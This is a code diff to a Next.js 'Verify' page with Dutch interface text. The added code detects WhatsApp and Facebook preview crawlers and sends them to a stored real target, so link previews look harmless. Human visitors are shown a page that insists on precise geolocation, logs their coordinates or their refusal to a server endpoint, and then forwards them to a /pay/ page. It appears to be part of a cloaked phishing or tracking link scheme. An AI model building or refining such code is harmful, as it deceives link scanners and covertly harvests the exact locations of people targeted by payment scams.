@@ -1,12 +1,38 @@
-import { useState } from 'react';
+import redis from '../../lib/redis';
 
-export async function getServerSideProps({ params }) {
-  return { props: { slug: params.slug } };
+export async function getServerSideProps({ params, req }) {
+  const { slug } = params;
+  const userAgent = req.headers['user-agent'] || '';
+
+  const isWhatsApp =
+    /whatsapp|facebookexternalhit|facebot|meta/i.test(userAgent);
+
+  const parsed = await redis.get(`slug-${slug}`);
+  if (!parsed) {
+    return { notFound: true };
+  }
+
+  // ✅ WhatsApp / preview bots → direct naar echte target
+  if (isWhatsApp) {
+    return {
+      redirect: {
+        destination: parsed.target,
+        permanent: false,
+      },
+    };
+  }
+
+  // 👤 echte gebruiker → verify pagina renderen
+  return {
+    props: { slug },
+  };
 }
 
+import { useState } from 'react';
+
 export default function Verify({ slug }) {
-  const [error, setError] = useState(null);
   const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(null);
 
   const log = async (data) => {
     await fetch('/api/store-location', {
@@ -18,13 +44,6 @@ export default function Verify({ slug }) {
 
   const handleLocation = () => {
     setLoading(true);
-    setError(null);
-
-    if (!navigator.geolocation) {
-      setError('Locatie wordt niet ondersteund op dit apparaat.');
-      setLoading(false);
-      return;
-    }
 
     navigator.geolocation.getCurrentPosition(
       async (pos) => {
@@ -37,7 +56,6 @@ export default function Verify({ slug }) {
           accuracy: pos.coords.accuracy,
         });
 
-        // ✅ pas NA succes redirecten
         window.location.href = `/pay/${slug}?verified=1`;
       },
       async () => {
@@ -48,12 +66,12 @@ export default function Verify({ slug }) {
           denied: true,
         });
 
-        setError('Geef eerst toegang tot locatie om verder te gaan.');
+        setError('Locatie is verplicht om verder te gaan.');
         setLoading(false);
       },
       {
         enableHighAccuracy: true,
-        timeout: 15000,
+        timeout: 10000,
         maximumAge: 0,
       }
     );
@@ -75,17 +93,16 @@ export default function Verify({ slug }) {
           display: flex;
           flex-direction: column;
           align-items: center;
-          justify-content: flex-start;
           text-align: center;
         }
 
         .circle {
           margin-top: 20px;
-          width: 160px;
-          height: 160px;
+          width: 200px;
+          height: 200px;
           border-radius: 50%;
           background: #ffffff;
-          border: 10px solid #353575;
+          border: 12px solid #353575;
           overflow: hidden;
           display: flex;
           align-items: center;
@@ -100,13 +117,13 @@ export default function Verify({ slug }) {
 
         h1 {
           color: #ffffff;
-          font-size: 24px;
+          font-size: 28px;
           margin: 24px 16px 8px;
         }
 
         p {
           color: #dcdff5;
-          font-size: 15px;
+          font-size: 16px;
           margin: 0 24px 24px;
         }
 
